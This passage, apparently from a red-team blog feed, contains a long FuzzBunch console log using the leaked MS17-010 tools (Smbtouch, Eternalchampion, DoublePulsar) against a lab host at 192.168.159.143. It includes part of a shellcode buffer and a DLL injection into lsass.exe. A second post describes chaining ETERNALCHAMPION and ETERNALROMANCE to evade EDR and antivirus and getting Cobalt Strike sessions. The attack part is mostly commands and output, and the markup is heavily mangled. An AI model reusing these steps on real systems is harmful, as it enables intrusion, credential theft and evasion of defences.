punctuation">]</span> Configure Plugin Remote TunnelsModule: Smbtouch<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Name                    Value                                                 ----                    -----                                                 NetworkTimeout          <span class="token number">60</span>                                                    TargetIp                <span class="token number">192.168</span>.159.143                                       TargetPort              <span class="token number">445</span>                                                   RedirectedTargetIp                                                            RedirectedTargetPort                                                          UsingNbt                False                                                 Pipe                                                                          Share                                                                         Protocol                SMB                                                   Credentials             Anonymous                                             <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Executing Plugin<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Smbtouch Succeededfb Touch <span class="token punctuation">(</span>Smbtouch<span class="token punctuation">)</span> <span class="token operator">></span> use Doublepulsar<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Entering Plugin Context :: Doublepulsar<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Applying Global Variables<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set NetworkTimeout <span class="token operator">=</span><span class="token operator">></span> <span class="token number">60</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set TargetIp <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.159.143fb Payload <span class="token punctuation">(</span>Doublepulsar<span class="token punctuation">)</span> <span class="token operator">></span> apply<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Applying Session Parameters<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set Protocol <span class="token operator">=</span><span class="token operator">></span> SMBfb Payload <span class="token punctuation">(</span>Doublepulsar<span class="token punctuation">)</span> <span class="token operator">></span> prompt confirm<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Enter Prompt Mode :: DoublepulsarModule: Doublepulsar<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Name              Value                                                 ----              -----                                                 NetworkTimeout    <span class="token number">60</span>                                                    TargetIp          <span class="token number">192.168</span>.159.143                                       TargetPort        <span class="token number">445</span>                                                   OutputFile                                                              Protocol          SMB                                                   Architecture      x86                                                   Function          OutputInstall                                         <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Plugin Variables are NOT Valid<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  NetworkTimeout :: Timeout <span class="token keyword">for</span> blocking network calls <span class="token punctuation">(</span>in seconds<span class="token punctuation">)</span>.  Use -1 <span class="token keyword">for</span> no timeout.<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  TargetIp :: Target IP Address<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  TargetPort :: Port used by the Double Pulsar back door<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Protocol :: Protocol <span class="token keyword">for</span> the backdoor to speak   *0<span class="token punctuation">)</span> SMB     Ring <span class="token number">0</span> SMB <span class="token punctuation">(</span>TCP <span class="token number">445</span><span class="token punctuation">)</span> backdoor    <span class="token number">1</span><span class="token punctuation">)</span> RDP     Ring <span class="token number">0</span> RDP <span class="token punctuation">(</span>TCP <span class="token number">3389</span><span class="token punctuation">)</span> backdoor<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Architecture :: Architecture of the target OS   *0<span class="token punctuation">)</span> x86     x86 <span class="token number">32</span>-bits    <span class="token number">1</span><span class="token punctuation">)</span> x64     x64 <span class="token number">64</span>-bits<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set Architecture <span class="token operator">=</span><span class="token operator">></span> x64<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Function :: Operation <span class="token keyword">for</span> backdoor to perform   *0<span class="token punctuation">)</span> OutputInstall     Only output the <span class="token function">install</span> shellcode to a binary <span class="token function">file</span> on disk.    <span class="token number">1</span><span class="token punctuation">)</span> Ping              Test <span class="token keyword">for</span> presence of backdoor    <span class="token number">2</span><span class="token punctuation">)</span> RunDLL            Use an APC to inject a DLL into a user mode process.    <span class="token number">3</span><span class="token punctuation">)</span> RunShellcode      Run raw shellcode    <span class="token number">4</span><span class="token punctuation">)</span> Uninstall         Remove<span class="token string">'s backdoor from system[*]  OutputFile :: Full path to the output file[+] Set OutputFile => c:\shellcode.binfb Payload (Doublepulsar) > execute[!] Preparing to Execute Doublepulsar[*] Redirection OFF[+] Configure Plugin Local Tunnels[+] Local Tunnel - local-tunnel-1[+] (TCP) Local 192.168.159.143:445[+] Configure Plugin Remote TunnelsModule: Doublepulsar====================Name              Value                                                 ----              -----                                                 NetworkTimeout    60                                                    TargetIp          192.168.159.143                                       TargetPort        445                                                   OutputFile        c:\shellcode.bin                                      Protocol          SMB                                                   Architecture      x64                                                   Function          OutputInstall                                         [*] Executing Plugin[+] Doublepulsar Succeededfb Payload (Doublepulsar) > fb Payload (Doublepulsar) > use eternalchampion[!] Entering Plugin Context :: Eternalchampion[*] Applying Global Variables[+] Set NetworkTimeout => 60[+] Set TargetIp => 192.168.159.143fb Special (Eternalchampion) > apply[*] Applying Session Parametersfb Special (Eternalchampion) > echo Running Exploit Touches[*] Running Exploit Touchesfb Special (Eternalchampion) > touch allfb Special (Eternalchampion) > use Smbtouch[!] Entering Plugin Context :: Smbtouch[*] Applying Global Variables[+] Set NetworkTimeout => 60[+] Set TargetIp => 192.168.159.143[*] Inheriting Input Variablesfb Touch (Smbtouch) > prompt[!] Enter Prompt Mode :: Smbtouch[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.[*]  TargetIp :: Target IP Address[*]  TargetPort :: Port used by the SMB service[*]  Pipe :: Test an additional pipe to see if it is accessible (optional)[*]  Share :: Test a file share to see if it is accessible (optional), entered as hex bytes (in unicode)[*]  Protocol :: SMB (default port 445) or NBT (default port 139)   *0) SMB         1) NBT     [*]  Credentials :: Type of credentials to use   *0) Anonymous     Anonymous (NULL session)    1) Guest         Guest account    2) Blank         User account with no password set    3) Password      User name and password    4) NTLM          User name and NTLM hashfb Touch (Smbtouch) > execute[!] Preparing to Execute Smbtouch[*] Redirection OFF[+] Configure Plugin Local Tunnels[+] Configure Plugin Remote TunnelsModule: Smbtouch================Name                    Value                                                 ----                    -----                                                 NetworkTimeout          60                                                    TargetIp                192.168.159.143                                       TargetPort              445                                                   RedirectedTargetIp                                                            RedirectedTargetPort                                                          UsingNbt                False                                                 Pipe                                                                          Share                                                                         Protocol                SMB                                                   Credentials             Anonymous                                             [*] Executing Plugin[+] Smbtouch Succeeded[*] Exporting Contract To Exploit[+] Set PipeName => lsarpc[+] Set ShareName => [+] Set Credentials => Anonymous[+] Set Target => SERVER_2008R2_SP1[+] Set TargetOsArchitecture => x64fb Touch (Smbtouch) > enter Specialfb Special (Eternalchampion) > prompt confirm[!] Enter Prompt Mode :: EternalchampionModule: Eternalchampion=======================Name                    Value                                                 ----                    -----                                                 NetworkTimeout          60                                                    TargetIp                192.168.159.143                                       TargetPort              445                                                   PipeName                lsarpc                                                ShareName                                                                     ShellcodeBuffer                                                               Credentials             Anonymous                                             Protocol                SMB                                                   Target                  SERVER_2008R2_SP1                                     TargetOsArchitecture    x64                                                   [!] Plugin Variables are NOT Valid[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.[*]  TargetIp :: The actual (non-redirected) Target IP Address[*]  TargetPort :: The actual (non-redirected) Target TCP port[*]  PipeName :: The named pipe to use (Win7+ only, need Pipe or Share)[*]  ShareName :: The name of the share to use in Unicode (Win7+ only, need Pipe or Share)[*]  ShellcodeBuffer :: DOPU Shellcode buffer[+] Set ShellcodeBuffer => 31C040900F8490060000E800000000586089C389E583EC6064... (plus 7260 characters)[*]  Credentials :: Type of credentials to use   *0) Anonymous     Anonymous (NULL session)    1) Guest         Guest account    2) Blank         User account with no password set    3) Password      User name and password    4) NTLM          User name and NTLM hash[*]  Protocol :: SMB (default port 445) or NBT (default port 139)   *0) SMB     SMB protocol    1) NBT     Netbios protocol[*]  Target :: Operating System, Service Pack, of target OS    0) XP_SP0SP1_X86         Windows XP Sp0 and Sp1, 32-bit    1) XP_SP2SP3_X86         Windows XP Sp2 and Sp3, 32-bit    2) XP_SP1_X64            Windows XP Sp1, 64-bit    3) XP_SP2_X64            Windows XP Sp2, 64-bit    4) SERVER_2003_SP0       Windows Sever 2003 Sp0, 32-bit    5) SERVER_2003_SP1       Windows Sever 2003 Sp1, 32-bit/64-bit    6) SERVER_2003_SP2       Windows Sever 2003 Sp2, 32-bit/64-bit    7) VISTA_SP0             Windows Vista Sp0, 32-bit/64-bit    8) VISTA_SP1             Windows Vista Sp1, 32-bit/64-bit    9) VISTA_SP2             Windows Vista Sp2, 32-bit/64-bit    10) SERVER_2008_SP0       Windows Server 2008 Sp0, 32-bit/64-bit    11) SERVER_2008_SP1       Windows Server 2008 Sp1, 32-bit/64-bit    12) SERVER_2008_SP2       Windows Server 2008 Sp2, 32-bit/64-bit    13) WIN7_SP0              Windows 7 Sp0, 32-bit/64-bit    14) WIN7_SP1              Windows 7 Sp1, 32-bit/64-bit    15) SERVER_2008R2_SP0     Windows Server 2008 R2 Sp0, 32-bit/64-bit   *16) SERVER_2008R2_SP1     Windows Server 2008 R2 Sp1, 32-bit/64-bit    17) WIN8_SP0              Windows 8 Sp0, 32-bit/64-bit[*]  TargetOsArchitecture :: The architecture of the target operating system    0) Unknown     The architecture is not known (exploit will figure it out)    1) x86         The target is 32-bit   *2) x64         The target is 64-bitfb Special (Eternalchampion) > execute[!] Preparing to Execute Eternalchampion[*]  Mode :: Delivery mechanism   *0) DANE     Forward deployment via DARINGNEOPHYTE    1) FB       Traditional deployment from within FUZZBUNCH[+] Run Mode: FB[*] Redirection OFF[+] Configure Plugin Local Tunnels[+] Configure Plugin Remote TunnelsModule: Eternalchampion=======================Name                    Value                                                 ----                    -----                                                 NetworkTimeout          60                                                    TargetIp                192.168.159.143                                       TargetPort              445                                                   RedirectedTargetIp                                                            RedirectedTargetPort                                                          DaveProxyPort           0                                                     MaxExploitAttempts      42                                                    PipeName                lsarpc                                                ShareName                                                                     ShellcodeBuffer         31c040900f8490060000e800000000586089c389e583ec6064                            8b0d38000000668b4106c1e010668b01662500f08b086681f9                            4d5a74072d00100000ebf08945fc5389c3b9940169e3e8c601                            00008945f8b9855483f0e8b90100008945f4b92e5b51d2e8ac                            0100008945ecb9b45ca05be89f0100008945a45bb914010000                            29cc890c2454ff55a48b4c24048b54240881c41401000031c0                            ... (plus 140 more lines)                             Credentials             Anonymous                                             Protocol                SMB                                                   Target                  SERVER_2008R2_SP1                                     TargetOsArchitecture    x64                                                   [*] Executing Plugin[+] Eternalchampion Succeededfb Special (Eternalchampion) > use doublepulsar[!] Entering Plugin Context :: Doublepulsar[*] Applying Global Variables[+] Set NetworkTimeout => 60[+] Set TargetIp => 192.168.159.143fb Payload (Doublepulsar) > apply[*] Applying Session Parameters[-] Error: Invalid value for Function ()[-] Skipping '</span>Function<span class="token string">'fb Payload (Doublepulsar) > prompt confirm[!] Enter Prompt Mode :: DoublepulsarModule: Doublepulsar====================Name              Value                                                 ----              -----                                                 NetworkTimeout    60                                                    TargetIp          192.168.159.143                                       TargetPort        445                                                   OutputFile        c:\shellcode.bin                                      Protocol          SMB                                                   Architecture      x64                                                   Function          OutputInstall                                         [!] plugin variables are valid[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.[*]  TargetIp :: Target IP Address[*]  TargetPort :: Port used by the Double Pulsar back door[*]  Protocol :: Protocol for the backdoor to speak   *0) SMB     Ring 0 SMB (TCP 445) backdoor    1) RDP     Ring 0 RDP (TCP 3389) backdoor[*]  Architecture :: Architecture of the target OS    0) x86     x86 32-bits   *1) x64     x64 64-bits[*]  Function :: Operation for backdoor to perform   *0) OutputInstall     Only output the install shellcode to a binary file on disk.    1) Ping              Test for presence of backdoor    2) RunDLL            Use an APC to inject a DLL into a user mode process.    3) RunShellcode      Run raw shellcode    4) Uninstall         Remove'</span>s backdoor from system<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set Function <span class="token operator">=</span><span class="token operator">></span> Pingfb Payload <span class="token punctuation">(</span>Doublepulsar<span class="token punctuation">)</span> <span class="token operator">></span> execute<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Preparing to Execute Doublepulsar<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Redirection OFF<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Configure Plugin Local Tunnels<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Local Tunnel - local-tunnel-1<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span> Local <span class="token number">192.168</span>.159.143:445<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Configure Plugin Remote TunnelsModule: Doublepulsar<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Name              Value                                                 ----              -----                                                 NetworkTimeout    <span class="token number">60</span>                                                    TargetIp          <span class="token number">192.168</span>.159.143                                       TargetPort        <span class="token number">445</span>                                                   Protocol          SMB                                                   Architecture      x64                                                   Function          Ping                                                  <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Executing Plugin<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Doublepulsar Succeededfb Payload <span class="token punctuation">(</span>Doublepulsar<span class="token punctuation">)</span> <span class="token operator">></span> use doublepulsar<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Entering Plugin Context :: Doublepulsar<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Applying Global Variables<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set NetworkTimeout <span class="token operator">=</span><span class="token operator">></span> <span class="token number">60</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set TargetIp <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.159.143fb Payload <span class="token punctuation">(</span>Doublepulsar<span class="token punctuation">)</span> <span class="token operator">></span> apply<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Applying Session Parameters<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Function :: DeconflictIndex    Session ID          Value                                                 -----    ----------          -----                                                 <span class="token number">0</span>        Doublepulsar - <span class="token number">1</span>                                                          <span class="token number">1</span>        Doublepulsar - <span class="token number">4</span>                                                          <span class="token number">2</span>        Current Value       Ping                                                  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Error: Invalid value <span class="token keyword">for</span> Function <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> Skipping <span class="token string">'Function'</span>fb Payload <span class="token punctuation">(</span>Doublepulsar<span class="token punctuation">)</span> <span class="token operator">></span> prompt confirm<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Enter Prompt Mode :: DoublepulsarModule: Doublepulsar<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Name              Value                                                 ----              -----                                                 NetworkTimeout    <span class="token number">60</span>                                                    TargetIp          <span class="token number">192.168</span>.159.143                                       TargetPort        <span class="token number">445</span>                                                   Protocol          SMB                                                   Architecture      x64                                                   Function          Ping                                                  <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> plugin variables are valid<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  NetworkTimeout :: Timeout <span class="token keyword">for</span> blocking network calls <span class="token punctuation">(</span>in seconds<span class="token punctuation">)</span>.  Use -1 <span class="token keyword">for</span> no timeout.<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  TargetIp :: Target IP Address<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  TargetPort :: Port used by the Double Pulsar back door<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Protocol :: Protocol <span class="token keyword">for</span> the backdoor to speak   *0<span class="token punctuation">)</span> SMB     Ring <span class="token number">0</span> SMB <span class="token punctuation">(</span>TCP <span class="token number">445</span><span class="token punctuation">)</span> backdoor    <span class="token number">1</span><span class="token punctuation">)</span> RDP     Ring <span class="token number">0</span> RDP <span class="token punctuation">(</span>TCP <span class="token number">3389</span><span class="token punctuation">)</span> backdoor<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Architecture :: Architecture of the target OS    <span class="token number">0</span><span class="token punctuation">)</span> x86     x86 <span class="token number">32</span>-bits   *1<span class="token punctuation">)</span> x64     x64 <span class="token number">64</span>-bits<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Function :: Operation <span class="token keyword">for</span> backdoor to perform    <span class="token number">0</span><span class="token punctuation">)</span> OutputInstall     Only output the <span class="token function">install</span> shellcode to a binary <span class="token function">file</span> on disk.   *1<span class="token punctuation">)</span> Ping              Test <span class="token keyword">for</span> presence of backdoor    <span class="token number">2</span><span class="token punctuation">)</span> RunDLL            Use an APC to inject a DLL into a user mode process.    <span class="token number">3</span><span class="token punctuation">)</span> RunShellcode      Run raw shellcode    <span class="token number">4</span><span class="token punctuation">)</span> Uninstall         Remove's backdoor from system<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set Function <span class="token operator">=</span><span class="token operator">></span> RunDLL<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  DllPayload :: DLL to inject into user mode<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set DllPayload <span class="token operator">=</span><span class="token operator">></span> C:<span class="token punctuation">\</span>dll<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  DllOrdinal :: The exported ordinal number of the DLL being injected to call<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  ProcessName :: Name of process to inject into<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  ProcessCommandLine :: Command line of process to inject intofb Payload <span class="token punctuation">(</span>Doublepulsar<span class="token punctuation">)</span> <span class="token operator">></span> execute<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Preparing to Execute Doublepulsar<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Redirection OFF<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Configure Plugin Local Tunnels<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Local Tunnel - local-tunnel-1<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span> Local <span class="token number">192.168</span>.159.143:445<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Configure Plugin Remote TunnelsModule: Doublepulsar<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Name                  Value                                                 ----                  -----                                                 NetworkTimeout        <span class="token number">60</span>                                                    TargetIp              <span class="token number">192.168</span>.159.143                                       TargetPort            <span class="token number">445</span>                                                   DllPayload            C:<span class="token punctuation">\</span>dll                          DllOrdinal            <span class="token number">1</span>                                                     ProcessName           lsass.exe                                             ProcessCommandLine                                                          Protocol              SMB                                                   Architecture          x64                                                   Function              RunDLL                                                <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Executing Plugin<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Doublepulsar Succeeded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> MS17010 </tag>
            
            <tag> ETERNALCHAMPION </tag>
            
            <tag> ETERNALROMANCE </tag>
            
            <tag> ETERNALSYNERGY </tag>
            
            <tag> ETERNALBLUE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS17010 Bypass Attack</title>
      <link href="2021/09/07/ms17010-bypass-attack/"/>
      <url>2021/09/07/ms17010-bypass-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">As we all know how to attack the ms17010, now I will tell you a way to bypass the EDR OR AV, of course you can&#39;t only use the ETERNALBLUEAt present, the 17010 vulnerability has been detected, protected and blocked in the normal situation. The success rate of the 17010 vulnerability will be greatly reduced when it encounters a protected target hostMany scenarios may be like this (ETERNALBLUE attack), but there may be no way to deal with AV<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Bypass%20Attack/image-20210906141052893.png"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ms17010 consists of several different vulnerabilities that are exploited <span class="token keyword">in</span> combination with ETERNALCHAMPION and ETERNALROMANCE to bypass EDR OR AVAttention this way need A user password OR A pipeUsing the public py script we will found the vulnerabilities<span class="token punctuation">[</span>*<span class="token punctuation">]</span> TargetIp              <span class="token number">192.168</span>.159.143<span class="token punctuation">[</span>*<span class="token punctuation">]</span> TargetPort            <span class="token number">445</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> RedirectedTargetIp    <span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> RedirectedTargetPort  <span class="token number">0</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetworkTimeout        <span class="token number">60</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Protocol              SMB<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Credentials           Anonymous<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Connecting to target<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Initiated SMB connection<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Target OS Version <span class="token number">6.1</span> build <span class="token number">7601</span>    Windows Server <span class="token number">2008</span> R2 Datacenter <span class="token number">7601</span> Service Pack <span class="token number">1</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying pipes<span class="token punctuation">..</span>.<span class="token punctuation">[</span>-<span class="token punctuation">]</span> spoolss    - Not accessible <span class="token punctuation">(</span>0xC0000022 - NtErrorAccessDenied<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> browser    - Not accessible <span class="token punctuation">(</span>0xC0000022 - NtErrorAccessDenied<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> lsarpc     - Success<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Binding to Rpc to determine architecture<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Target is <span class="token number">64</span>-bit<span class="token punctuation">[</span>Not Supported<span class="token punctuation">]</span>ETERNALSYNERGY  - Target OS version not supported<span class="token punctuation">[</span>Vulnerable<span class="token punctuation">]</span>ETERNALBLUE     - DANEETERNALROMANCE  - FBETERNALCHAMPION - DANE/FB<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Writing output parameters<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Target is vulnerable to <span class="token number">3</span> exploits<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Touch completed successfully<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Bypass%20Attack/pic2.png"></p><h3 id="Exec-program"><a href="#Exec-program" class="headerlink" title="Exec program"></a>Exec program</h3><pre class="line-numbers language-none"><code class="language-none">When I modify the public script to exec something and use a domain user to auth must be success <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Bypass%20Attack/image-20210906141811133.png"></p><pre class="line-numbers language-none"><code class="language-none">Confirm success like this，<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Bypass%20Attack/image-20210906141916680.png"></p><pre class="line-numbers language-none"><code class="language-none">Under current circumstances, ordinary domain users can not end our process, only administrator users to carry out<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Bypass%20Attack/image-20210906142053890.png"></p><h3 id="Online-CS"><a href="#Online-CS" class="headerlink" title="Online CS"></a>Online CS</h3><pre class="line-numbers language-none"><code class="language-none">Using the same way must be easy to online cs, but you must be confire your exe can be bypass AV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 